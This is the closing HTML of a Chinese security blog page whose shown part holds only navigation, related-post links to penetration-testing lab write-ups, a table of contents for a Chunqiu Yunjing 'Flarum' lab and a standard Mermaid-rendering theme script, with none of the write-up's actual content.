var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">春秋云镜Spoofing</div></div></a></div><div class="next-post pull-right"><a href="/2025/04/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CDelivery/" title="春秋云镜Delivery"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">春秋云镜Delivery</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/10/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/" title="春秋云镜Initial"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-10</div><div class="title">春秋云镜Initial</div></div></a></div><div><a href="/2025/02/21/Bugku%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951-4/" title="Bugku渗透测试1-4"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-21</div><div class="title">Bugku渗透测试1-4</div></div></a></div><div><a href="/2025/02/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTime/" title="春秋云镜Time"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-23</div><div class="title">春秋云镜Time</div></div></a></div><div><a href="/2025/02/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/" title="春秋云镜Tsclient"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-23</div><div class="title">春秋云镜Tsclient</div></div></a></div><div><a href="/2025/02/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cbrute4road/" title="春秋云镜brute4road"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-23</div><div class="title">春秋云镜brute4road</div></div></a></div><div><a href="/2025/03/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/" title="春秋云镜Hospital"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-02</div><div class="title">春秋云镜Hospital</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="author-info__name">P4tt0n</div><div class="author-info__description">徐徐前进！</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">30</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/p4tt0n"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CFlarum"><span class="toc-number">1.</span> <span class="toc-text">春秋云镜Flarum</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%85%B3"><span class="toc-number">1.0.1.</span> <span class="toc-text">第一关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E5%85%B3"><span class="toc-number">1.0.2.</span> <span class="toc-text">第三关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E5%85%B3"><span class="toc-number">1.0.3.</span> <span class="toc-text">第四关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%85%B3"><span class="toc-number">1.0.4.</span> <span class="toc-text">第二关</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CSpoofing/" title="春秋云镜Spoofing">春秋云镜Spoofing</a><time datetime="2025-04-25T06:39:33.000Z" title="发表于 2025-04-25 14:39:33">2025-04-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CFlarum/" title="春秋云镜Flarum">春秋云镜Flarum</a><time datetime="2025-04-25T06:38:19.000Z" title="发表于 2025-04-25 14:38:19">2025-04-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CDelivery/" title="春秋云镜Delivery">春秋云镜Delivery</a><time datetime="2025-04-25T06:36:39.000Z" title="发表于 2025-04-25 14:36:39">2025-04-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/25/2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98/" title="2022网鼎杯半决赛复盘">2022网鼎杯半决赛复盘</a><time datetime="2025-04-25T06:33:18.000Z" title="发表于 2025-04-25 14:33:18">2025-04-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/11/2025%E5%B9%B4%E7%8D%AC%E8%B1%B8%E6%9D%AF%E6%9C%8D%E5%8A%A1%E5%99%A8wp/" title="2025年獬豸杯服务器wp">2025年獬豸杯服务器wp</a><time datetime="2025-04-11T11:59:20.000Z" title="发表于 2025-04-11 19:59:20">2025-04-11</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">©2020 - 2025 By P4tt0n</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.14.0-b3"></script><script src="/js/main.js?v=4.14.0-b3"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.35/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+  const runMermaid = (ele) => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    Array.from(ele).forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
+      const mermaidID = 'mermaid-' + index
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+
+      const renderV10 = () => {
+        renderFn.then(({svg}) => {
+          mermaidSrc.insertAdjacentHTML('afterend', svg)
+        })
+      }
+
+      const renderV9 = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      typeof renderFn === 'string' ? renderV9(renderFn) : renderV10()
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+    
+    codeMermaidEle.forEach(ele => {
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.innerHTML = `<pre class="mermaid-src" hidden>${ele.textContent}</pre>`
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (false) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@10.9.0/dist/mermaid.min.js').then(runMermaidFn)
+  }
+  
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="false"></script><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
